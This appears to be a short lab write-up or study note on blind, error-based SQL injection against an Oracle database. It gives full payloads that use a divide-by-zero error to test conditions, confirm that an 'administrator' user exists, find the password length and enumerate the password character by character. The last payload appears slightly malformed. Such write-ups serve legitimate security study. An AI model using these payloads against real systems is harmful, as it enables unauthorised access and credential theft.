# Blind SQL injection with conditional errors (ORACLE DB)

* For this case is really important to understand that, the only notice that we have to know if something has been introduce ok or not is if there is an error or not.

For the case that i was studying, i have tried to cause the error using SQL statement. However it was a oracle database, so,  i was able to retrieve useful information  using oracle commands

<mark style="color:orange;">**'||(select case when (1=2) then to\_char(1/0) else null end from dual)||'**</mark>

<figure><img src="../../../.gitbook/assets/sql-1.png" alt=""><figcaption></figcaption></figure>

If the statement is correct 1=1 we generate an error

<figure><img src="../../../.gitbook/assets/sql-correct.png" alt=""><figcaption></figcaption></figure>

if the statement is incorrect we do not generate any error

<figure><img src="../../../.gitbook/assets/sql2-imcorrect.png" alt=""><figcaption></figcaption></figure>

Then to enumerate the database lets see if administrator user exist:

`'||(select case when (1=1) then to_char(1/0) else '' end from users where username='administrator')||'`

In this statement if username='administrator' is True the part of the instruction where the error exist will be invoque:\
`select case when (1=1) then to_char(1/0)`&#x20;

Otherwise, if username='administrator' doesn't exist it will not show any error

<figure><img src="../../../.gitbook/assets/sql-hard.png" alt=""><figcaption><p>Administrator user exist</p></figcaption></figure>

The next step is to try to obtain the password length, to do this we use the following command:

\
`'||(select case when (1=1) then to_char(1/0) else '' end from users where username='administrator' and length(password)>=20)||'`

length(password)>$ we fuzz that statement and check the output, as we can see the error stop at line 21 it means that the password has a length of 20 characters. The next step is to detect the value of each position.

<figure><img src="../../../.gitbook/assets/sql-password length.png" alt=""><figcaption></figcaption></figure>

Enumerating username/password position character in oracle

`'||(select case when substr(username,1,1)='§a§' then to_char(1/0) else '' end from users where username='administrator'||'`
